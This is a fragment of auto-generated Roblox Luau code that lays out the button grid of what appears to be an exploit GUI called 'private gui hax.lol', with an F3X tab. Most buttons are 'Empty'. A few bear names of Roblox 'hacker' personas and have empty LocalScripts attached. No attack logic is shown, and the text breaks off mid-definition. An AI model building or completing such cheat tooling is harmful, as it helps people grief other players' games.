+G2L["df"] = Instance.new("TextButton", G2L["7a"]);
+G2L["df"]["TextWrapped"] = true;
+G2L["df"]["BorderSizePixel"] = 3;
+G2L["df"]["TextSize"] = 14;
+G2L["df"]["TextScaled"] = true;
+G2L["df"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["df"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["df"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["df"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["df"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["df"]["Text"] = [[Empty]];
+G2L["df"]["Name"] = [[Button]];
+G2L["df"]["Position"] = UDim2.new(-0.00466, 0, 22.61259, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button
+G2L["e0"] = Instance.new("TextButton", G2L["7a"]);
+G2L["e0"]["TextWrapped"] = true;
+G2L["e0"]["BorderSizePixel"] = 3;
+G2L["e0"]["TextSize"] = 14;
+G2L["e0"]["TextScaled"] = true;
+G2L["e0"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["e0"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["e0"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["e0"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["e0"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["e0"]["Text"] = [[Empty]];
+G2L["e0"]["Name"] = [[Button]];
+G2L["e0"]["Position"] = UDim2.new(-5.30993, 0, 24.01884, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button
+G2L["e1"] = Instance.new("TextButton", G2L["7a"]);
+G2L["e1"]["TextWrapped"] = true;
+G2L["e1"]["BorderSizePixel"] = 3;
+G2L["e1"]["TextSize"] = 14;
+G2L["e1"]["TextScaled"] = true;
+G2L["e1"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["e1"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["e1"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["e1"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["e1"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["e1"]["Text"] = [[Empty]];
+G2L["e1"]["Name"] = [[Button]];
+G2L["e1"]["Position"] = UDim2.new(-4.02571, 0, 24.01884, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button
+G2L["e2"] = Instance.new("TextButton", G2L["7a"]);
+G2L["e2"]["TextWrapped"] = true;
+G2L["e2"]["BorderSizePixel"] = 3;
+G2L["e2"]["TextSize"] = 14;
+G2L["e2"]["TextScaled"] = true;
+G2L["e2"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["e2"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["e2"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["e2"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["e2"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["e2"]["Text"] = [[Empty]];
+G2L["e2"]["Name"] = [[Button]];
+G2L["e2"]["Position"] = UDim2.new(-2.66782, 0, 24.01884, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button
+G2L["e3"] = Instance.new("TextButton", G2L["7a"]);
+G2L["e3"]["TextWrapped"] = true;
+G2L["e3"]["BorderSizePixel"] = 3;
+G2L["e3"]["TextSize"] = 14;
+G2L["e3"]["TextScaled"] = true;
+G2L["e3"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["e3"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["e3"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["e3"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["e3"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["e3"]["Text"] = [[Empty]];
+G2L["e3"]["Name"] = [[Button]];
+G2L["e3"]["Position"] = UDim2.new(-1.35203, 0, 24.01884, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button
+G2L["e4"] = Instance.new("TextButton", G2L["7a"]);
+G2L["e4"]["TextWrapped"] = true;
+G2L["e4"]["BorderSizePixel"] = 3;
+G2L["e4"]["TextSize"] = 14;
+G2L["e4"]["TextScaled"] = true;
+G2L["e4"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["e4"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["e4"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["e4"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["e4"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["e4"]["Text"] = [[Empty]];
+G2L["e4"]["Name"] = [[Button]];
+G2L["e4"]["Position"] = UDim2.new(-0.00466, 0, 24.01884, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button
+G2L["e5"] = Instance.new("TextButton", G2L["7a"]);
+G2L["e5"]["TextWrapped"] = true;
+G2L["e5"]["BorderSizePixel"] = 3;
+G2L["e5"]["TextSize"] = 14;
+G2L["e5"]["TextScaled"] = true;
+G2L["e5"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["e5"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["e5"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["e5"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["e5"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["e5"]["Text"] = [[Empty]];
+G2L["e5"]["Name"] = [[Button]];
+G2L["e5"]["Position"] = UDim2.new(-5.30993, 0, 25.48759, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button
+G2L["e6"] = Instance.new("TextButton", G2L["7a"]);
+G2L["e6"]["TextWrapped"] = true;
+G2L["e6"]["BorderSizePixel"] = 3;
+G2L["e6"]["TextSize"] = 14;
+G2L["e6"]["TextScaled"] = true;
+G2L["e6"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["e6"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["e6"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["e6"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["e6"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["e6"]["Text"] = [[Empty]];
+G2L["e6"]["Name"] = [[Button]];
+G2L["e6"]["Position"] = UDim2.new(-4.02571, 0, 25.51884, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button
+G2L["e7"] = Instance.new("TextButton", G2L["7a"]);
+G2L["e7"]["TextWrapped"] = true;
+G2L["e7"]["BorderSizePixel"] = 3;
+G2L["e7"]["TextSize"] = 14;
+G2L["e7"]["TextScaled"] = true;
+G2L["e7"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["e7"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["e7"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["e7"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["e7"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["e7"]["Text"] = [[Empty]];
+G2L["e7"]["Name"] = [[Button]];
+G2L["e7"]["Position"] = UDim2.new(-2.66782, 0, 25.51884, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button
+G2L["e8"] = Instance.new("TextButton", G2L["7a"]);
+G2L["e8"]["TextWrapped"] = true;
+G2L["e8"]["BorderSizePixel"] = 3;
+G2L["e8"]["TextSize"] = 14;
+G2L["e8"]["TextScaled"] = true;
+G2L["e8"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["e8"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["e8"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["e8"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["e8"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["e8"]["Text"] = [[Empty]];
+G2L["e8"]["Name"] = [[Button]];
+G2L["e8"]["Position"] = UDim2.new(-1.35203, 0, 25.48759, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button
+G2L["e9"] = Instance.new("TextButton", G2L["7a"]);
+G2L["e9"]["TextWrapped"] = true;
+G2L["e9"]["BorderSizePixel"] = 3;
+G2L["e9"]["TextSize"] = 14;
+G2L["e9"]["TextScaled"] = true;
+G2L["e9"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["e9"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["e9"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["e9"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["e9"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["e9"]["Text"] = [[Empty]];
+G2L["e9"]["Name"] = [[Button]];
+G2L["e9"]["Position"] = UDim2.new(-0.00466, 0, 25.48759, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button
+G2L["ea"] = Instance.new("TextButton", G2L["7a"]);
+G2L["ea"]["TextWrapped"] = true;
+G2L["ea"]["BorderSizePixel"] = 3;
+G2L["ea"]["TextSize"] = 14;
+G2L["ea"]["TextScaled"] = true;
+G2L["ea"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["ea"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["ea"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["ea"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["ea"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["ea"]["Text"] = [[Empty]];
+G2L["ea"]["Name"] = [[Button]];
+G2L["ea"]["Position"] = UDim2.new(-5.30993, 0, 27.08134, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button
+G2L["eb"] = Instance.new("TextButton", G2L["7a"]);
+G2L["eb"]["TextWrapped"] = true;
+G2L["eb"]["BorderSizePixel"] = 3;
+G2L["eb"]["TextSize"] = 14;
+G2L["eb"]["TextScaled"] = true;
+G2L["eb"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["eb"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["eb"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["eb"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["eb"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["eb"]["Text"] = [[Empty]];
+G2L["eb"]["Name"] = [[Button]];
+G2L["eb"]["Position"] = UDim2.new(-4.02571, 0, 27.08134, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button
+G2L["ec"] = Instance.new("TextButton", G2L["7a"]);
+G2L["ec"]["TextWrapped"] = true;
+G2L["ec"]["BorderSizePixel"] = 3;
+G2L["ec"]["TextSize"] = 14;
+G2L["ec"]["TextScaled"] = true;
+G2L["ec"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["ec"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["ec"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["ec"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["ec"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["ec"]["Text"] = [[Empty]];
+G2L["ec"]["Name"] = [[Button]];
+G2L["ec"]["Position"] = UDim2.new(-2.66782, 0, 27.08134, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button
+G2L["ed"] = Instance.new("TextButton", G2L["7a"]);
+G2L["ed"]["TextWrapped"] = true;
+G2L["ed"]["BorderSizePixel"] = 3;
+G2L["ed"]["TextSize"] = 14;
+G2L["ed"]["TextScaled"] = true;
+G2L["ed"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["ed"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["ed"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["ed"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["ed"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["ed"]["Text"] = [[Empty]];
+G2L["ed"]["Name"] = [[Button]];
+G2L["ed"]["Position"] = UDim2.new(-1.35203, 0, 27.08134, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button
+G2L["ee"] = Instance.new("TextButton", G2L["7a"]);
+G2L["ee"]["TextWrapped"] = true;
+G2L["ee"]["BorderSizePixel"] = 3;
+G2L["ee"]["TextSize"] = 14;
+G2L["ee"]["TextScaled"] = true;
+G2L["ee"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["ee"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["ee"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["ee"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["ee"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["ee"]["Text"] = [[Empty]];
+G2L["ee"]["Name"] = [[Button]];
+G2L["ee"]["Position"] = UDim2.new(-0.00466, 0, 27.08134, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button
+G2L["ef"] = Instance.new("TextButton", G2L["7a"]);
+G2L["ef"]["TextWrapped"] = true;
+G2L["ef"]["BorderSizePixel"] = 3;
+G2L["ef"]["TextSize"] = 14;
+G2L["ef"]["TextScaled"] = true;
+G2L["ef"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["ef"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["ef"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["ef"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["ef"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["ef"]["Text"] = [[Empty]];
+G2L["ef"]["Name"] = [[Button]];
+G2L["ef"]["Position"] = UDim2.new(-5.30993, 0, 28.64384, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button
+G2L["f0"] = Instance.new("TextButton", G2L["7a"]);
+G2L["f0"]["TextWrapped"] = true;
+G2L["f0"]["BorderSizePixel"] = 3;
+G2L["f0"]["TextSize"] = 14;
+G2L["f0"]["TextScaled"] = true;
+G2L["f0"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["f0"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["f0"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["f0"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["f0"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["f0"]["Text"] = [[Empty]];
+G2L["f0"]["Name"] = [[Button]];
+G2L["f0"]["Position"] = UDim2.new(-4.02571, 0, 28.64384, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button
+G2L["f1"] = Instance.new("TextButton", G2L["7a"]);
+G2L["f1"]["TextWrapped"] = true;
+G2L["f1"]["BorderSizePixel"] = 3;
+G2L["f1"]["TextSize"] = 14;
+G2L["f1"]["TextScaled"] = true;
+G2L["f1"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["f1"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["f1"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["f1"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["f1"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["f1"]["Text"] = [[Empty]];
+G2L["f1"]["Name"] = [[Button]];
+G2L["f1"]["Position"] = UDim2.new(-2.66782, 0, 28.64384, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button
+G2L["f2"] = Instance.new("TextButton", G2L["7a"]);
+G2L["f2"]["TextWrapped"] = true;
+G2L["f2"]["BorderSizePixel"] = 3;
+G2L["f2"]["TextSize"] = 14;
+G2L["f2"]["TextScaled"] = true;
+G2L["f2"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["f2"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["f2"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["f2"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["f2"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["f2"]["Text"] = [[Empty]];
+G2L["f2"]["Name"] = [[Button]];
+G2L["f2"]["Position"] = UDim2.new(-1.35203, 0, 28.64384, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button
+G2L["f3"] = Instance.new("TextButton", G2L["7a"]);
+G2L["f3"]["TextWrapped"] = true;
+G2L["f3"]["BorderSizePixel"] = 3;
+G2L["f3"]["TextSize"] = 14;
+G2L["f3"]["TextScaled"] = true;
+G2L["f3"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["f3"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["f3"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["f3"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["f3"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["f3"]["Text"] = [[Empty]];
+G2L["f3"]["Name"] = [[Button]];
+G2L["f3"]["Position"] = UDim2.new(-0.00466, 0, 28.64384, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button
+G2L["f4"] = Instance.new("TextButton", G2L["7a"]);
+G2L["f4"]["TextWrapped"] = true;
+G2L["f4"]["BorderSizePixel"] = 3;
+G2L["f4"]["TextSize"] = 14;
+G2L["f4"]["TextScaled"] = true;
+G2L["f4"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["f4"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["f4"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["f4"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["f4"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["f4"]["Text"] = [[Empty]];
+G2L["f4"]["Name"] = [[Button]];
+G2L["f4"]["Position"] = UDim2.new(-5.30993, 0, 30.20634, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button
+G2L["f5"] = Instance.new("TextButton", G2L["7a"]);
+G2L["f5"]["TextWrapped"] = true;
+G2L["f5"]["BorderSizePixel"] = 3;
+G2L["f5"]["TextSize"] = 14;
+G2L["f5"]["TextScaled"] = true;
+G2L["f5"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["f5"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["f5"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["f5"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["f5"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["f5"]["Text"] = [[Empty]];
+G2L["f5"]["Name"] = [[Button]];
+G2L["f5"]["Position"] = UDim2.new(-4.02571, 0, 30.17509, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button
+G2L["f6"] = Instance.new("TextButton", G2L["7a"]);
+G2L["f6"]["TextWrapped"] = true;
+G2L["f6"]["BorderSizePixel"] = 3;
+G2L["f6"]["TextSize"] = 14;
+G2L["f6"]["TextScaled"] = true;
+G2L["f6"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["f6"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["f6"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["f6"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["f6"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["f6"]["Text"] = [[Empty]];
+G2L["f6"]["Name"] = [[Button]];
+G2L["f6"]["Position"] = UDim2.new(-2.66782, 0, 30.20634, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button
+G2L["f7"] = Instance.new("TextButton", G2L["7a"]);
+G2L["f7"]["TextWrapped"] = true;
+G2L["f7"]["BorderSizePixel"] = 3;
+G2L["f7"]["TextSize"] = 14;
+G2L["f7"]["TextScaled"] = true;
+G2L["f7"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["f7"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["f7"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["f7"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["f7"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["f7"]["Text"] = [[Empty]];
+G2L["f7"]["Name"] = [[Button]];
+G2L["f7"]["Position"] = UDim2.new(-1.35203, 0, 30.20634, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button
+G2L["f8"] = Instance.new("TextButton", G2L["7a"]);
+G2L["f8"]["TextWrapped"] = true;
+G2L["f8"]["BorderSizePixel"] = 3;
+G2L["f8"]["TextSize"] = 14;
+G2L["f8"]["TextScaled"] = true;
+G2L["f8"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["f8"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["f8"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["f8"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["f8"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["f8"]["Text"] = [[Empty]];
+G2L["f8"]["Name"] = [[Button]];
+G2L["f8"]["Position"] = UDim2.new(-0.00466, 0, 30.20634, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button
+G2L["f9"] = Instance.new("TextButton", G2L["7a"]);
+G2L["f9"]["TextWrapped"] = true;
+G2L["f9"]["BorderSizePixel"] = 3;
+G2L["f9"]["TextSize"] = 14;
+G2L["f9"]["TextScaled"] = true;
+G2L["f9"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["f9"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["f9"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["f9"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["f9"]["BorderColor3"] = Color3.fromRGB(155, 155, 155);
+G2L["f9"]["Text"] = [[r04dbl0ck1ng]];
+G2L["f9"]["Name"] = [[Button]];
+G2L["f9"]["Position"] = UDim2.new(-5.30993, 0, 32.98759, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button.LocalScript
+G2L["fa"] = Instance.new("LocalScript", G2L["f9"]);
+
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button
+G2L["fb"] = Instance.new("TextButton", G2L["7a"]);
+G2L["fb"]["TextWrapped"] = true;
+G2L["fb"]["BorderSizePixel"] = 3;
+G2L["fb"]["TextSize"] = 14;
+G2L["fb"]["TextScaled"] = true;
+G2L["fb"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["fb"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["fb"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["fb"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["fb"]["BorderColor3"] = Color3.fromRGB(0, 18, 255);
+G2L["fb"]["Text"] = [[Young Oliver]];
+G2L["fb"]["Name"] = [[Button]];
+G2L["fb"]["Position"] = UDim2.new(-2.67835, 0, 34.42509, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button.LocalScript
+G2L["fc"] = Instance.new("LocalScript", G2L["fb"]);
+
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button
+G2L["fd"] = Instance.new("TextButton", G2L["7a"]);
+G2L["fd"]["TextWrapped"] = true;
+G2L["fd"]["BorderSizePixel"] = 3;
+G2L["fd"]["TextSize"] = 14;
+G2L["fd"]["TextScaled"] = true;
+G2L["fd"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["fd"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["fd"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["fd"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["fd"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["fd"]["Text"] = [[cZerkidd]];
+G2L["fd"]["Name"] = [[Button]];
+G2L["fd"]["Position"] = UDim2.new(-2.66782, 0, 32.98759, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button.LocalScript
+G2L["fe"] = Instance.new("LocalScript", G2L["fd"]);
+
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button
+G2L["ff"] = Instance.new("TextButton", G2L["7a"]);
+G2L["ff"]["TextWrapped"] = true;
+G2L["ff"]["BorderSizePixel"] = 3;
+G2L["ff"]["TextSize"] = 14;
+G2L["ff"]["TextScaled"] = true;
+G2L["ff"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["ff"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["ff"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["ff"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["ff"]["BorderColor3"] = Color3.fromRGB(255, 0, 5);
+G2L["ff"]["Text"] = [[c00lkidd]];
+G2L["ff"]["Name"] = [[Button]];
+G2L["ff"]["Position"] = UDim2.new(-5.30993, 0, 34.42509, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button.LocalScript
+G2L["100"] = Instance.new("LocalScript", G2L["ff"]);
+
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button
+G2L["101"] = Instance.new("TextButton", G2L["7a"]);
+G2L["101"]["TextWrapped"] = true;
+G2L["101"]["BorderSizePixel"] = 3;
+G2L["101"]["TextSize"] = 14;
+G2L["101"]["TextScaled"] = true;
+G2L["101"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["101"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["101"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["101"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["101"]["BorderColor3"] = Color3.fromRGB(72, 213, 255);
+G2L["101"]["Text"] = [[1sw0rd1 anonymous]];
